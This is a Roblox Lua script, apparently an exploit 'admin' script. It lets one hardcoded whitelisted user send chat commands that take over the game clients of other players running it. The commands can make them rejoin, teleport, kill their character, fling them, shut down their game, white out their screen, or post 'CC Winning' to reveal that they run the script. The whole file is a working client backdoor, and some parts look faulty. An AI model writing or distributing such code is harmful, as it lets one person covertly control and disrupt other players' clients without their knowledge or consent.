local Whitelisted = {
  2495657990,
}

for i,v in pairs(game.Players:GetChildren()) do
    if table.find(Whitelisted, v.UserId) then
        local handler = {Commands = {}}
        local PREFIX = ";"

        function ParseMessage(Message)
            local Arguments = {}
            Message = string.lower(Message)
            local PrefixMatch = string.match(Message,"^"..PREFIX)
            if PrefixMatch then
                Message = string.gsub(Message,PrefixMatch,"",1)
                for Argument in string.gmatch(Message,"[^%s]+") do
                    table.insert(Arguments,Argument)
                end
            end
            return Arguments
        end
        function psearch(arg)
            local plr
            for i, v in pairs(game.Players:GetPlayers()) do 
                if string.lower(string.sub(v.Name, 1, string.len(arg))) == string.lower(arg) then
                    plr = v
                end
            end
            if plr then
            return plr
            else
                -- Nothing
            end
        end

        function handler:AddCommand(commandname,cmddesc,sc)
            local cmdinformation = {commandname}
            if sc == nil then
                sc = cmddesc
                cmddesc = nil
                table.insert(cmdinformation,sc)
                else
                table.insert(cmdinformation,cmddesc)
                table.insert(cmdinformation,sc)
            end
            table.insert(handler.Commands,cmdinformation)
        end
        v.Chatted:Connect(function(msg)
            local IsACmd = false
            msg = msg:lower()
            if msg:sub(1,3) == "/e " then
                msg = msg:sub(4)
            end
            local args = ParseMessage(msg)
            for i,cmd in pairs(handler.Commands) do
                if args[1] == cmd[1] then
                    IsACmd = true
                    table.remove(args,1)
                    if type(cmd[3]) == "function" then
                        cmd[3](args)
                        else
                        cmd[2](args)
                    end
                end
            end
            if not IsACmd then
                -- Nothing
            end
        end)
        handler:AddCommand("rejoin","",function(args)
            local plr = psearch(args[1])
            if plr then
                if game.Players.LocalPlayer.Name == plr.Name then
                    if not table.find(Whitelisted, plr.UserId) then
                        local ts = game:GetService("TeleportService")
                        local p = game:GetService("Players").LocalPlayer
                        ts:Teleport(game.PlaceId, p)
                    end
                end
            end
        end)
        handler:AddCommand("bring","",function(args)
            local plr = psearch(args[1])
            if plr then
                if game.Players.LocalPlayer.Name == plr.Name then
                    if not table.find(Whitelisted, plr.UserId) then
                        local root = v.Character:FindFirstChild("HumanoidRootPart")
                        if root then
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = root.CFrame
                        end
                    end
                end
            end
        end)

        handler:AddCommand("refresh","",function(args)
            local plr = psearch(args[1])
            if plr then
                if game.Players.LocalPlayer.Name == plr.Name then
                    if not table.find(Whitelisted, plr.UserId) then
                        local OldPlace = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                        game.Players.LocalPlayer.Character.Humanoid:Destroy()
                        repeat
                            wait()
                        until game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OldPlace
                    end
                end
            end
        end)
        handler:AddCommand("fling","",function(args)
            local plr = psearch(args[1])
            if plr then
                if game.Players.LocalPlayer.Name == plr.Name then
                    if not table.find(Whitelisted, plr.UserId) then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(500000,500000,500000)
                    end
                end
            end
        end)
        handler:AddCommand("shutdown","",function(args)
            local plr = psearch(args[1])
            if plr then
                if game.Players.LocalPlayer.Name == plr.Name then
                    if not table.find(Whitelisted, plr.UserId) then
                        game:Shutdown()
                    end
                end
            end
        end)
        handler:AddCommand("pepper","",function(args)
            local plr = psearch(args[1])
            if plr then
                if game.Players.LocalPlayer.Name == plr.Name then
                    if not table.find(Whitelisted, plr.UserId) then
                        local Cloned = plr.PlayerGui.MainScreenGui.PepperSpray:Clone()
                        Cloned.Name = "CCSpray"
                        Cloned.Visible = true
                    end
                end
            end
        end)
        handler:AddCommand("unpepper","",function(args)
            local plr = psearch(args[1])
            if plr then
                if game.Players.LocalPlayer.Name == plr.Name then
                    if not table.find(Whitelisted, plr.UserId) then
                        if plr.PlayerGui.MainScreenGui:FindFirstChild("CCSpray") then
                            plr.PlayerGui.MainScreenGui:FindFirstChild("CCSpray"):Destroy()
                        end
                    end
                end
            end
        end)
        handler:AddCommand("flash","",function(args)
            local plr = psearch(args[1])
            if plr then
                if game.Players.LocalPlayer.Name == plr.Name then
                    if not table.find(Whitelisted, plr.UserId) then
                        local Flash = Instance.new("Frame")
                        Flash.Size = UDim2.new(1, 0, 1, 0)
                        Flash.Name = "whiteScreen"
                        Flash.BackgroundColor3 = Color3.fromRGB(255,255,255)
                        Flash.Parent = plr.PlayerGui.MainScreenGui
                        Flash.BackgroundTransparency = Flash.BackgroundTransparency + 0.01
                    end
                end
            end
        end)
        handler:AddCommand("unflash","",function(args)
            local plr = psearch(args[1])
            if plr then
                if game.Players.LocalPlayer.Name == plr.Name then
                    if not table.find(Whitelisted, plr.UserId) then
                        if plr.PlayerGui.MainScreenGui:FindFirstChild("whiteScreen") then
                            plr.PlayerGui.MainScreenGui:FindFirstChild("whiteScreen"):Destroy()
                        end
                    end
                end
            end
        end)
        v.Chatted:Connect(function(msg)
            if msg == "/e find" then
                if not table.find(Whitelisted, game.Players.LocalPlayer.UserId) then
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("CC Winning", 'All');
                end
            end
        end)
    end
end
